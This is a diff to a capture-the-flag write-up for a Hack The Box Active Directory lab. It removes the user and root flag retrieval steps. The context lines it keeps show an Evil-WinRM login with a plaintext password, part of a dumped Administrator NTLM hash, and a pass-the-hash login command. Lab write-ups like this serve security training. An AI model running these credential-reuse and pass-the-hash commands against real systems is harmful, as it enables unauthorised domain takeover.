@@ -96,12 +96,6 @@ With valid credentials, I connected via Evil-WinRM:
 evil-winrm -i 10.129.1.248 -u svc-alfresco -p 's3rvice'
 ```
 
-### User Flag
-```bash
-cd C:\Users\svc-alfresco\Desktop
-type user.txt
-```
-
 ---
 
 ## Privilege Escalation
@@ -178,12 +172,6 @@ htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d
 ### Step 5: Pass-the-Hash
 ```bash
 evil-winrm -i 10.129.1.248 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
-```
-
-### Root Flag
-```bash
-cd C:\Users\Administrator\Desktop
-type root.txt
 ```
 
 ---
